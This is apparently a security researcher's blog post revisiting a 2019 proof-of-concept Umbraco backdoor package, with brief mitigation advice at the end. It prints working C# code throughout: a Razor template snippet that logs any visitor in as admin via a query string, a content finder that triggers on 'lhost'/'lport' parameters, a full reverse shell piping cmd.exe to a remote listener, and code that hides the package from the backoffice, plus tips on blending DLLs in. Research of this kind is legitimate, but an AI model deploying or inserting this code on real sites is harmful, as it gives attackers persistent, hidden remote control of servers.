---
title: UmBackdoor
icon: 🚪
date: 2026-04-23
description: A research project from the archives - reverse shells and persistence via Umbraco.
tags:
  - umbraco
  - dotnet
metaImage: /images/donut-heart.png
metaImageAlt: A heart made of donuts
---

*UmBackdoor* was the name of a proof-of-concept Umbraco package I created as
part of a research project back in 2019, around the time I was just getting
into offensive security. I say "research project", but it could probably be
better described as "dicking around", and there is nothing groundbreaking here.

Some of the research went on to feature in the "Offensive Umbraco" talks I
gave in the following years, and some was left to rot in private
repositories, until now. I've made the
[UmBackdoor repository](https://codeberg.org/stvnhrlnd/UmBackdoor)
public, but of course it has no documentation, so in this post I'll attempt
to describe what the package did based on my very hazy memory of the
*Before Times™* and the artifacts I managed to unearth.

---

## Contents

- [Admin password resets](#admin-password-resets)
  - [Alternative (batshit) approach](#alternative-(batshit)-approach)
- [UmBackdoor](#umbackdoor)
  - [Demo video](#demo-video)
  - [How it works](#how-it-works)
  - [Trying to hide](#trying-to-hide)
  - [Other goodies](#other-goodies)
- [Mitigations](#mitigations)
- [Conclusion](#conclusion)

---

## Admin password resets

I will get to UmBackdoor shortly, but first the reason why I got here and
decided to write this post...

Last week I stumbled across an interesting and aptly named package on the
Umbraco Marketplace -
[uBrokenWindow](https://marketplace.umbraco.com/package/ubrokenwindow)
by Ben Szymanski. From the package readme, this is:

> The worst possible password reset utility, specially built for Umbraco.

This reminded me of the old
[Umbraco admin reset](https://our.umbraco.com/packages/developer-tools/umbraco-admin-reset/)
package by Richard Soeteman, which was a DLL we used to drop into a site's
`bin` folder when we forgot the admin password.

Joe Glombek also reminded me of
[another technique](https://joe.gl/ombek/blog/reset-umbraco-user-passwords/)
which involves enabling the password reset feature and using a local SMTP server
to intercept the reset email.

And yet another method from the official
[Umbraco docs](https://docs.umbraco.com/umbraco-cms/reference/security/reset-admin-password)
is simply to clear the connection string in the config file and run the
installer.

All totally valid approaches, and some wonderfully "hacky". Here's another...

### Alternative (batshit) approach

This isn't so much a password reset as it is a *backdoor to the backoffice*.

It is a Razor snippet that can be dropped into an Umbraco template that
automatically logs you into the backoffice as the admin user.
I couldn't find the original code, but I remembered roughly what it did, so
I recreated it for Umbraco 17.

Simply paste this into a template, then go to a page
on the frontend that uses that template, and add the query string `?letmein=pls` to
the URL to be signed in as admin and redirected to the backoffice:

```csharp
@inject Umbraco.Cms.Web.Common.Security.BackOfficeUserManager userManager;
@inject Microsoft.AspNetCore.Identity.SignInManager<Umbraco.Cms.Core.Security.BackOfficeIdentityUser> signInManager;
@if (Context.Request.Query["letmein"] == "pls")
{
    var user = await userManager.FindByIdAsync("-1");
    await signInManager.SignInAsync(user, true);
    Context.Response.Redirect("/umbraco");
}
```

And no, I don't recommend anyone use this 👀.

The reason I wrote it originally was not actually to regain access to a
backoffice I was locked out of. It was to demonstrate a potential
*persistence* mechanism - a payload that an attacker might drop in order to
*retain* access to an already-compromised backoffice, even if the admin user
changed their password.

The other persistence technique I explored at the time was using a package or DLL,
which leads me to...

## UmBackdoor

The goal of this project was to create a package that could be installed by
an attacker *after* getting into the backoffice. This was back when packages
could be installed directly through the backoffice, a feature I am glad is
[long gone](https://umbraco.com/blog/packages-in-umbraco-9-via-nuget/).

Once installed, the package provided the attacker with the ability to spawn a
*reverse shell* on the underlying server, even if they lost access to the
backoffice. The procedure would look something like this:

1. An attacker obtains admin access to the Umbraco backoffice, installs the UmBackdoor package.
2. The attacker starts a *listener* on a server they own, which needs to be accessible over the Internet. This is often done using [netcat](https://en.wikipedia.org/wiki/Netcat).
3. The attacker triggers UmBackdoor by making a request to the victim website with certain query string parameters.
4. A shell process (`cmd.exe`) is started on the victim server with its input and output redirected to the attacker's listener.
5. The shell "pops" on the attacker's side where they can issue commands to the victim server remotely.

### Demo video

I managed to find this old screen recording which shows the above steps being
carried out from the attacker perspective (from the attacking server):

<video controls>
  <source src="/videos/umbackdoor/package-reverse-shell.mp4" type="video/mp4" />
</video>

### How it works

The package consisted of just one thing - a
[content finder](https://docs.umbraco.com/umbraco-cms/reference/routing/request-pipeline/icontentfinder)
that would execute on every request to the the site, so that the backdoor
could be triggered at any time, without needing backoffice access.

The content finder looked for query parameters named `lhost` and `lport` which
were expected to contain the IP address and port of the attacker's
server/listener (I should note this is slightly different from the demo above
in which I must have hardcoded the host and port in the package).

When the content finder detected these query params it would spawn the
reverse shell. Legitimate requests to the site would simply pass through the
content finder so the site would continue to function as normal:

```csharp
public bool TryFindContent(PublishedRequest request)
{
    var qs = HttpUtility.ParseQueryString(request.Uri.Query);
    if (!string.IsNullOrWhiteSpace(qs["lhost"]) &&
        !string.IsNullOrWhiteSpace(qs["lport"]) &&
        int.TryParse(qs["lport"], out int port))
    {
        try
        {
            RemovePackageNode();
            ReverseShell(qs["lhost"], port);
        }
        catch { }
    }

    return false;
}
```

The `ReverseShell` method worked by opening a TCP connection to the given
host/port (where netcat is listening). A `cmd.exe` process was started on the
victim server with its standard input and output redirected to the TCP stream
(and therefore to netcat where the attacker could send and receive commands):

```csharp
private void ReverseShell(string ip, int port)
{
    using (var client = new TcpClient(ip, port))
    using (var stream = client.GetStream())
    using (var reader = new StreamReader(stream))
    using (var writer = new StreamWriter(stream))
    using (var process = new Process())
    {
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.RedirectStandardInput = true;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.RedirectStandardError = true;
        process.StartInfo.UseShellExecute = false;

        var dataReceivedEventHandler = new DataReceivedEventHandler((sender, args) =>
        {
            try
            {
                writer.WriteLine(args.Data);
                writer.Flush();
            }
            catch { }
        });

        process.OutputDataReceived += dataReceivedEventHandler;
        process.ErrorDataReceived += dataReceivedEventHandler;

        process.Start();
        process.BeginOutputReadLine();
        process.BeginErrorReadLine();

        process.StandardInput.WriteLine();

        while (true)
        {
            process.StandardInput.WriteLine(reader.ReadLine());
        }
    }
}
```

### Trying to hide

If you watched the demo to the end you may have noticed that the
package disappears from the list of installed packages in the backoffice, in
an effort to stay hidden (at least from backoffice users).

This was achieved by removing the relevant `package` element from the
`installedPackages.config` XML file (another relic that no longer exists):

```csharp
private void RemovePackageNode()
{
    var configPath = HostingEnvironment.MapPath("~/App_Data/packages/installedPackages.config");
    var xmlDocument = new XmlDocument();
    xmlDocument.Load(configPath);

    var packageNode = xmlDocument.SelectSingleNode("//package[@name='UmBackdoor']");
    if (packageNode != null)
    {
        packageNode.ParentNode.RemoveChild(packageNode);
        xmlDocument.Save(configPath);
    }
}
```

Doing this doesn't make us totally "clean on OpSec" though. Anyone looking at
the `bin` folder would still see `UmBackdoor.dll` for example. So if I was an
attacker I'd probably rename things to try and blend in with the Umbraco core
DLLs.

### Other goodies

Looking through the repo, it seems I was also playing around with a
[Razor web shell](https://codeberg.org/stvnhrlnd/UmBackdoor/src/branch/master/Umbraco.Site/Views/master.cshtml#L73),
and a
[Razor reverse shell](https://codeberg.org/stvnhrlnd/UmBackdoor/src/branch/master/Umbraco.Site/Views/master.cshtml#L108)
(which is pretty much the same reverse shell from the
content finder, but in a view). Here's a bonus demo of a Razor reverse shell
being used:

<video controls>
  <source src="/videos/umbackdoor/razor-reverse-shell.mp4" type="video/mp4" />
</video>

---

## Mitigations

What I've described in this post are some *post-exploitation* techniques an
attacker might use *after* compromising access to the backoffice. So obviously
you want to ensure that doesn't happen in the first place, and the usual
advice applies to protect your backoffice (strong passwords, multi-factor auth,
IP allow-listing, etc etc).

Use the
[Principle of Least Privilege](https://en.wikipedia.org/wiki/Principle_of_least_privilege)
when it comes to assigning permissions to
backoffice users. Not everyone needs to be an admin or have access to
the Settings section of Umbraco. In particular you want to protect your Razor
templates as they are such an easy way to execute arbitrary C# code.

Packages can't be installed in the backoffice since Umbraco 9,
so that particular risk is not a concern anymore. If you're on Umbraco 8 or
below, then it's
[time to upgrade](https://umbraco.com/products/knowledge-center/long-term-support-and-end-of-life/umbraco-8-end-of-life-eol/)
anyway.

---

## Conclusion

I dunno what to conclude.
This was just a fun look at some lesser-known Umbraco "lore" from the
archives. Hopefully it was kinda interesting.
